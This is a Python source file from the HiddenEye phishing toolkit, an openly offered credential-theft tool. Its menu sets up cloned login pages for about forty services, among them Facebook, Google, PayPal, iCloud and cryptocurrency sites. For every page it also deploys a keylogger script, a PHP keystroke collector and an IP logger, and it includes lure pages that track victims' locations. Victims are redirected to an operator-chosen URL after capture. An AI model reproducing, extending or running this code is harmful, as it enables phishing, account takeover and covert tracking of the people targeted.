#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import (
    run_command,
    webpage_set,
    wait,
    path,
    rmtree,
    pathlib_Path,
    copyfile,
    chmod,
    mkdir,
    remove,
)
import Defs.ActionManager.simple_informant as simple_informant
import Defs.LocalizationManager.lang_action_manager.lang_main_runner as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
from Defs.LocalizationManager.helper import print_sorted_as_menu
import os
import time

module_loading_message = simple_informant.module_loading_message


def start_main_menu():
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(localization.lang_start_main_menu["version_by_darksec"])
    print(localization.lang_start_main_menu["short_description"])
    print(localization.lang_start_main_menu["features_summary"])
    print(localization.lang_start_main_menu["down_line"])
    print(localization.lang_start_main_menu["attack_vector_message"])
    print(localization.lang_start_main_menu["phishing_modules_header"])

    # phishing_col_width = max(len(word) for row in phishing_modules_list for word in row) + 2
    # for row in phishing_modules_list:
    # print("".join(word.ljust(phishing_col_width) for word in row).format(default_palette[0], default_palette[2]))
    print_sorted_as_menu(localization.lang_start_main_menu["phishing_modules_list"])
    print(localization.lang_start_main_menu["additional_modules"])

    # additional_col_width = max(len(word) for row in additional_modules_list for word in row) + 2
    # for row in additional_modules_list:
    # print("".join(word.ljust(additional_col_width) for word in row).format(default_palette[0], default_palette[2]))
    print_sorted_as_menu(localization.lang_start_main_menu["additional_modules_list"])

    option = input(global_localization.input_line)
    option = option.zfill(2)
    if option == "01":
        module_loading_message("Facebook")
        # customOption = input("\nOperation mode:\n {0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["facebook_operation_modes"]
        )
        customOption = input(global_localization.input_line)
        start_phishing_page("Facebook", customOption)
    elif option == "02":
        module_loading_message("Google")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["google_operation_modes"]
        )
        # customOption = input(
        # \n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        customOption = input(global_localization.input_line)
        start_phishing_page("Google", customOption)
    elif option == "03":
        module_loading_message("LinkedIn")
        customOption = ""
        start_phishing_page("LinkedIn", customOption)
    elif option == "04":
        module_loading_message("GitHub")
        customOption = ""
        start_phishing_page("GitHub", customOption)
    elif option == "05":
        module_loading_message("StackOverflow")
        customOption = ""
        start_phishing_page("StackOverflow", customOption)
    elif option == "06":
        module_loading_message("WordPress")
        customOption = ""
        start_phishing_page("WordPress", customOption)
    elif option == "07":
        module_loading_message("Twitter")
        customOption = ""
        start_phishing_page("Twitter", customOption)
    elif option == "08":
        module_loading_message("Instagram")
        # customOption = input("\nOperation mode:\n n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["instagram_operation_modes"]
        )
        customOption = input(global_localization.input_line)
        start_phishing_page("Instagram", customOption)
    elif option == "09":
        module_loading_message("Snapchat")
        customOption = ""
        start_phishing_page("Snapchat", customOption)
    elif option == "10":
        module_loading_message("Yahoo")
        customOption = ""
        start_phishing_page("Yahoo", customOption)
    elif option == "11":
        module_loading_message("Twitch")
        customOption = ""
        start_phishing_page("Twitch", customOption)
    elif option == "12":
        module_loading_message("Microsoft")
        customOption = ""
        start_phishing_page("Microsoft", customOption)
    elif option == "13":
        module_loading_message("Steam")
        customOption = ""
        start_phishing_page("Steam", customOption)
    elif option == "14":
        module_loading_message("VK")
        # customOption = input(
        #    "\nOperation mode:\n
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(localization.lang_start_main_menu["VK_operation_modes"])
        customOption = input(global_localization.input_line)
        start_phishing_page("VK", customOption)
    elif option == "15":
        module_loading_message("iCloud")
        customOption = ""
        start_phishing_page("iCloud", customOption)
    elif option == "16":
        module_loading_message("GitLab")
        customOption = ""
        start_phishing_page("GitLab", customOption)
    elif option == "17":
        module_loading_message("NetFlix")
        customOption = ""
        start_phishing_page("NetFlix", customOption)
    elif option == "18":
        module_loading_message("Origin")
        customOption = ""
        start_phishing_page("Origin", customOption)
    elif option == "19":
        module_loading_message("Pinterest")
        customOption = ""
        start_phishing_page("Pinterest", customOption)
    elif option == "20":
        module_loading_message("ProtonMail")
        customOption = ""
        start_phishing_page("ProtonMail", customOption)
    elif option == "21":
        module_loading_message("Spotify")
        customOption = ""
        start_phishing_page("Spotify", customOption)
    elif option == "22":
        module_loading_message("Quora")
        customOption = ""
        start_phishing_page("Quora", customOption)
    elif option == "23":
        module_loading_message("PornHub")
        customOption = ""
        start_phishing_page("PornHub", customOption)
    elif option == "24":
        module_loading_message("Adobe")
        customOption = ""
        start_phishing_page("Adobe", customOption)
    elif option == "25":
        module_loading_message("Badoo")
        customOption = ""
        start_phishing_page("Badoo", customOption)
    elif option == "26":
        module_loading_message("CryptoCurrency")
        customOption = ""
        start_phishing_page("CryptoCurrency", customOption)
    elif option == "27":
        module_loading_message("DevianArt")
        customOption = ""
        start_phishing_page("DevianArt", customOption)
    elif option == "28":
        module_loading_message("DropBox")
        customOption = ""
        start_phishing_page("DropBox", customOption)
    elif option == "29":
        module_loading_message("eBay")
        customOption = ""
        start_phishing_page("eBay", customOption)
    elif option == "30":
        module_loading_message("MySpace")
        customOption = ""
        start_phishing_page("Myspace", customOption)
    elif option == "31":
        module_loading_message("PayPal")
        customOption = ""
        start_phishing_page("PayPal", customOption)
    elif option == "32":
        module_loading_message("Shopify")
        customOption = ""
        start_phishing_page("Shopify", customOption)
    elif option == "33":
        module_loading_message("Verizon")
        customOption = ""
        start_phishing_page("Verizon", customOption)
    elif option == "34":
        module_loading_message("Yandex")
        customOption = ""
        start_phishing_page("Yandex", customOption)
    elif option == "35":
        module_loading_message("Reddit")
        # customOption = input(
        #    "\nOperation mode:\nHiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["reddit_operation_modes"]
        )
        customOption = input(global_localization.input_line)
        start_phishing_page("Reddit", customOption)
    elif option == "36":
        module_loading_message("Subitoit")
        customOption = ""
        start_phishing_page("Subitoit", customOption)
    elif option == "37":
        module_loading_message("PlayStation")
        customOption = ""
        start_phishing_page("PlayStation", customOption)
    elif option == "38":
        module_loading_message("Xbox")
        customOption = ""
        start_phishing_page("Xbox", customOption)
    elif option == "39":
        module_loading_message("CUSTOM(1)")
        customOption = ""
        start_phishing_page("CUSTOM(1)", customOption)
    elif option == "40":
        module_loading_message("CUSTOM(2)")
        customOption = ""
        start_phishing_page("CUSTOM(2)", customOption)

    # Below Are Tools And Above Are Phishing Modules..

    elif option == "0A":
        module_loading_message("LOCATION")
        # customOption = input(
        #    "\nOperation mode:\n \n\n{0}HiddenEye >>> {1}".format(default_palette[0], default_palette[2]))
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu[
                "additional_module_location_operation_modes"
            ]
        )
        customOption = input(global_localization.input_line)
        start_phishing_page("LOCATION", customOption)

    else:
        start_main_menu()


def start_phishing_page(page, custom_option):  # Phishing pages selection menu
    # chmod('Server', 777)
    run_command(["chmod", "-R", "777", "Server"])
    rmtree("Server/www", onerror=simple_informant.remove_readonly)
    mkdir("Server/www")
    # chmod('Server/www', 777)
    pathlib_Path("Server/www/usernames.txt").touch()
    pathlib_Path("Server/www/ip.txt").touch()
    copyfile("WebPages/ip.php", "Server/www/ip.php")
    copyfile("WebPages/KeyloggerData.txt", "Server/www/KeyloggerData.txt")
    copyfile("WebPages/keylogger.js", "Server/www/keylogger.js")
    copyfile("WebPages/keylogger.php", "Server/www/keylogger.php")
    try:
        remove("link.url")
    except:
        pass

    if custom_option == "1" and page == "Facebook":
        webpage_set("WebPages/fb_standard/", "Server/www/")
    elif custom_option == "2" and page == "Facebook":
        webpage_set("WebPages/fb_advanced_poll/", "Server/www/")
    elif custom_option == "3" and page == "Facebook":
        webpage_set("WebPages/fb_security_fake/", "Server/www/")
    elif custom_option == "4" and page == "Facebook":
        webpage_set("WebPages/fb_messenger/", "Server/www/")
    elif custom_option == "1" and page == "Google":
        webpage_set("WebPages/google_standard/", "Server/www/")
    elif custom_option == "2" and page == "Google":
        webpage_set("WebPages/google_advanced_poll/", "Server/www/")
    elif custom_option == "3" and page == "Google":
        webpage_set("WebPages/google_advanced_web/", "Server/www/")
    elif page == "LinkedIn":
        webpage_set("WebPages/linkedin/", "Server/www/")
    elif page == "GitHub":
        webpage_set("WebPages/GitHub/", "Server/www/")
    elif page == "StackOverflow":
        webpage_set("WebPages/stackoverflow/", "Server/www/")
    elif page == "WordPress":
        webpage_set("WebPages/wordpress/", "Server/www/")
    elif page == "Twitter":
        webpage_set("WebPages/twitter/", "Server/www/")
    elif page == "Snapchat":
        webpage_set("WebPages/Snapchat_web/", "Server/www/")
    elif page == "Yahoo":
        webpage_set("WebPages/yahoo_web/", "Server/www/")
    elif page == "Twitch":
        webpage_set("WebPages/twitch/", "Server/www/")
    elif page == "Microsoft":
        webpage_set("WebPages/live_web/", "Server/www/")
    elif page == "Steam":
        webpage_set("WebPages/steam/", "Server/www/")
    elif page == "iCloud":
        webpage_set("WebPages/iCloud/", "Server/www/")
    elif custom_option == "1" and page == "Instagram":
        webpage_set("WebPages/Instagram_web/", "Server/www/")
    elif custom_option == "2" and page == "Instagram":
        webpage_set("WebPages/Instagram_autoliker/", "Server/www/")
    elif custom_option == "3" and page == "Instagram":
        webpage_set("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif custom_option == "4" and page == "Instagram":
        webpage_set("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif custom_option == "5" and page == "Instagram":
        webpage_set("WebPages/instafollowers/", "Server/www/")
    elif custom_option == "1" and page == "VK":
        webpage_set("WebPages/VK/", "Server/www/")
    elif custom_option == "2" and page == "VK":
        webpage_set("WebPages/VK_poll_method/", "Server/www/")
    elif page == "GitLab":
        webpage_set("WebPages/gitlab/", "Server/www/")
    elif page == "NetFlix":
        webpage_set("WebPages/netflix/", "Server/www/")
    elif page == "Origin":
        webpage_set("WebPages/origin/", "Server/www/")
    elif page == "Pinterest":
        webpage_set("WebPages/pinterest/", "Server/www/")
    elif page == "ProtonMail":
        webpage_set("WebPages/protonmail/", "Server/www/")
    elif page == "Spotify":
        webpage_set("WebPages/spotify/", "Server/www/")
    elif page == "Quora":
        webpage_set("WebPages/quora/", "Server/www/")
    elif page == "PornHub":
        webpage_set("WebPages/pornhub/", "Server/www/")
    elif page == "Adobe":
        webpage_set("WebPages/adobe/", "Server/www/")
    elif page == "Badoo":
        webpage_set("WebPages/badoo/", "Server/www/")
    elif page == "CryptoCurrency":
        webpage_set("WebPages/cryptocurrency/", "Server/www/")
    elif page == "DevianArt":
        webpage_set("WebPages/devianart/", "Server/www/")
    elif page == "DropBox":
        webpage_set("WebPages/dropbox/", "Server/www/")
    elif page == "eBay":
        webpage_set("WebPages/ebay/", "Server/www/")
    elif page == "Myspace":
        webpage_set("WebPages/myspace/", "Server/www/")
    elif page == "PayPal":
        webpage_set("WebPages/paypal/", "Server/www/")
    elif page == "Shopify":
        webpage_set("WebPages/shopify/", "Server/www/")
    elif page == "Verizon":
        webpage_set("WebPages/verizon/", "Server/www/")
    elif page == "Yandex":
        webpage_set("WebPages/yandex/", "Server/www/")
    elif custom_option == "1" and page == "Reddit":
        webpage_set("WebPages/Reddit/", "Server/www/")
    elif custom_option == "2" and page == "Reddit":
        webpage_set("WebPages/Reddit-old/", "Server/www/")
    elif page == "Subitoit":
        webpage_set("WebPages/subitoit/", "Server/www/")
    elif page == "PlayStation":
        webpage_set("WebPages/playstation/", "Server/www/")
    elif page == "Xbox":
        webpage_set("WebPages/xbox/", "Server/www/")
    elif page == "CUSTOM(1)":
        print(
            localization.lang_start_phishing_page["custom_folder_directory"].format(
                page=page
            )
        )
        print(
            localization.lang_start_phishing_page["manual_reading_suggestion"].format(
                page=page
            )
        )
        input(
            localization.lang_start_phishing_page[
                "press_enter_to_contunue_if_setup_correctly"
            ]
        )
        print(localization.lang_start_phishing_page["copying_your_files"])
        wait(3)
        webpage_set("WebPages/CUSTOM(1)/", "Server/www/")
    elif page == "CUSTOM(2)":
        print(
            localization.lang_start_phishing_page["custom_folder_directory"].format(
                page=page
            )
        )
        print(
            localization.lang_start_phishing_page["manual_reading_suggestion"].format(
                page=page
            )
        )
        input(
            localization.lang_start_phishing_page[
                "press_enter_to_contunue_if_setup_correctly"
            ]
        )
        print(localization.lang_start_phishing_page["copying_your_files"])
        wait(3)
        webpage_set("WebPages/CUSTOM(2)/", "Server/www/")

    # Tools Below && Phishing Pages Above
    elif custom_option == "1" and page == "LOCATION":
        wait(3)
        webpage_set("WebPages/TOOLS/nearyou", "Server/www/")
        print(localization.lang_start_phishing_page["https_suggestion"])
        input(
            localization.lang_start_phishing_page[
                "press_enter_to_contunue_if_setup_correctly"
            ]
        )
    elif custom_option == "2" and page == "LOCATION":
        wait(3)
        webpage_set("WebPages/TOOLS/gdrive", "Server/www/")
        print(localization.lang_start_phishing_page["https_suggestion"])
        print(localization.lang_start_phishing_page["gdrive_suggestion"])
        input(
            localization.lang_start_phishing_page[
                "press_enter_to_contunue_if_setup_correctly"
            ]
        )

    else:
        run_command("clear")
        print("Please choose a valid option")
        time.sleep(1)
        start_main_menu()


def enter_custom_redirecting_url():  # Question where user can input custom web-link
    run_command("clear")

    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(
        localization.lang_enter_custom_redirecting_url["enter_redirecting_url_header"]
    )
    print(
        localization.lang_enter_custom_redirecting_url["enter_redirecting_url_prompt"]
    )
    custom = input(localization.lang_enter_custom_redirecting_url["redirect_here"])
    if "http://" in custom or "https://" in custom:
        pass
    else:
        custom = "http://" + custom

    # For Location (gdrive) Template Redirection.
    if path.exists("Server/www/js/location.js"):
        with open("Server/www/js/location.js") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/js/location.js", "w")
        f.write(c)
        f.close()

    if path.exists("Server/www/post.php") and path.exists("Server/www/login.php"):
        with open("Server/www/login.php") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/login.php", "w")
        f.write(c)
        f.close()

        with open("Server/www/post.php") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/post.php", "w")
        f.write(c)
        f.close()

    else:
        with open("Server/www/login.php") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/login.php", "w")
        f.write(c)
        f.close()
